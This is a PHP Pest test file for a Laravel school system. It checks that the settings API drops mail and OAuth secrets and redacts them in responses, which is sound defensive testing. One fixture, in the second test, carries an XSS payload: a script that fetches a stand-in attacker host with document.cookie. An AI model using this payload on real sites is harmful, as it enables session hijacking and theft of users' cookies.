<?php

declare(strict_types=1);

use App\Models\GeneralSetting;
use App\Models\User;
use Spatie\Permission\Models\Permission;

use function Pest\Laravel\actingAs;

it('does not persist mail transport credentials through the generic settings API', function (): void {
    $user = User::factory()->create();

    foreach (['View:SystemManagementSchool', 'Update:SystemManagementSchool'] as $permission) {
        Permission::firstOrCreate([
            'name' => $permission,
            'guard_name' => 'web',
        ]);
    }

    $user->givePermissionTo([
        'View:SystemManagementSchool',
        'Update:SystemManagementSchool',
    ]);

    actingAs($user, 'sanctum')
        ->postJson('/api/settings', [
            'site_name' => 'Test School',
            'currency' => 'PHP',
            'email_from_address' => 'legacy@school.example',
            'email_from_name' => 'Legacy Sender',
            'email_settings' => [
                'host' => 'smtp.school.example',
                'username' => 'legacy-user',
                'password' => 'legacy-password',
            ],
            'sequenzy_api_key' => 'legacy-provider-key',
        ])
        ->assertCreated();

    $setting = GeneralSetting::query()->sole();

    expect($setting->email_settings)->toBeNull()
        ->and($setting->currency)->toBe('PHP')
        ->and($setting->email_from_address)->toBeNull()
        ->and($setting->email_from_name)->toBeNull()
        ->and($setting->sequenzy_api_key)->toBeNull();
});

it('does not persist oauth client secrets or more_configs through the generic settings API', function (): void {
    $user = User::factory()->create();

    foreach (['View:SystemManagementSchool', 'Update:SystemManagementSchool'] as $permission) {
        Permission::firstOrCreate([
            'name' => $permission,
            'guard_name' => 'web',
        ]);
    }

    $user->givePermissionTo([
        'View:SystemManagementSchool',
        'Update:SystemManagementSchool',
    ]);

    actingAs($user, 'sanctum')
        ->postJson('/api/settings', [
            'site_name' => 'Secure School',
            'social_network' => [
                'facebook' => 'https://facebook.com/secureschool',
                'google_client_id' => 'google-client-id-123',
                'google_client_secret' => 'SUPER-SECRET-OAUTH-VALUE',
                'github_client_secret' => 'ANOTHER-SECRET-VALUE',
            ],
            'more_configs' => [
                'error_reporting' => [
                    'providers' => [
                        'sentry' => [
                            'frontend_script' => '<script>fetch("//evil.test/?c="+document.cookie)</script>',
                        ],
                    ],
                ],
            ],
        ])
        ->assertCreated();

    $setting = GeneralSetting::query()->sole();

    expect($setting->more_configs)->toBeEmpty()
        ->and(data_get($setting->social_network, 'facebook'))->toBe('https://facebook.com/secureschool')
        ->and(data_get($setting->social_network, 'google_client_id'))->toBe('google-client-id-123')
        ->and(data_get($setting->social_network, 'google_client_secret'))->toBeNull()
        ->and(data_get($setting->social_network, 'github_client_secret'))->toBeNull();
});

it('redacts oauth client secrets and more_configs secrets in GeneralSettingResource', function (): void {
    $user = User::factory()->create();

    foreach (['View:SystemManagementSchool', 'Update:SystemManagementSchool'] as $permission) {
        Permission::firstOrCreate([
            'name' => $permission,
            'guard_name' => 'web',
        ]);
    }

    $user->givePermissionTo([
        'View:SystemManagementSchool',
        'Update:SystemManagementSchool',
    ]);

    $setting = GeneralSetting::factory()->create([
        'social_network' => [
            'facebook' => 'https://facebook.com/example',
            'google_client_id' => 'public-google-client-id',
            'google_client_secret' => 'SUPER-SECRET-OAUTH-VALUE',
            'facebook_client_secret' => 'FACEBOOK-SECRET-VALUE',
        ],
        'more_configs' => [
            'error_reporting' => [
                'providers' => [
                    'flare' => [
                        'enabled' => true,
                        'api_key' => 'FLARE-SECRET-API-KEY',
                    ],
                    'sentry' => [
                        'enabled' => true,
                        'dsn' => 'https://public@sentry.io/1',
                    ],
                ],
            ],
            'application_integrations' => [
                'google_calendar' => [
                    'enabled' => true,
                    'client_id' => 'gcal-id',
                    'client_secret' => 'GCAL-SECRET-KEY',
                ],
            ],
            'notification_channels' => [
                'pusher' => [
                    'key' => 'pusher-key',
                    'secret' => 'PUSHER-SECRET-KEY',
                ],
            ],
            'enrollment_pipeline' => [
                'entry_step_key' => 'pending',
            ],
        ],
    ]);

    $response = actingAs($user, 'sanctum')
        ->getJson("/api/settings/{$setting->id}")
        ->assertOk();

    $response->assertJsonPath('data.social_network.facebook', 'https://facebook.com/example')
        ->assertJsonPath('data.social_network.google_client_id', 'public-google-client-id')
        ->assertJsonMissingPath('data.social_network.google_client_secret')
        ->assertJsonMissingPath('data.social_network.facebook_client_secret')
        ->assertJsonMissingPath('data.more_configs.error_reporting.providers.flare.api_key')
        ->assertJsonMissingPath('data.more_configs.application_integrations.google_calendar.client_secret')
        ->assertJsonMissingPath('data.more_configs.notification_channels.pusher.secret')
        ->assertJsonPath('data.more_configs.error_reporting.providers.sentry.dsn', 'https://public@sentry.io/1')
        ->assertJsonPath('data.more_configs.notification_channels.pusher.key', 'pusher-key')
        ->assertJsonPath('data.more_configs.enrollment_pipeline.entry_step_key', 'pending');
});

it('redacts secrets when accessing individual settings by key', function (): void {
    $user = User::factory()->create();

    foreach (['View:SystemManagementSchool'] as $permission) {
        Permission::firstOrCreate([
            'name' => $permission,
            'guard_name' => 'web',
        ]);
    }

    $user->givePermissionTo(['View:SystemManagementSchool']);

    GeneralSetting::factory()->create([
        'social_network' => [
            'facebook' => 'https://facebook.com/example',
            'google_client_secret' => 'SUPER-SECRET-OAUTH-VALUE',
        ],
        'more_configs' => [
            'application_integrations' => [
                'google_calendar' => [
                    'client_secret' => 'GCAL-SECRET-KEY',
                ],
            ],
        ],
    ]);

    actingAs($user, 'sanctum')
        ->getJson('/api/settings/key/social_network')
        ->assertOk()
        ->assertJsonPath('data.value.facebook', 'https://facebook.com/example')
        ->assertJsonMissingPath('data.value.google_client_secret');

    actingAs($user, 'sanctum')
        ->getJson('/api/settings/key/more_configs')
        ->assertOk()
        ->assertJsonMissingPath('data.value.application_integrations.google_calendar.client_secret');

    actingAs($user, 'sanctum')
        ->getJson('/api/settings/key/sequenzy_api_key')
        ->assertNotFound();
});
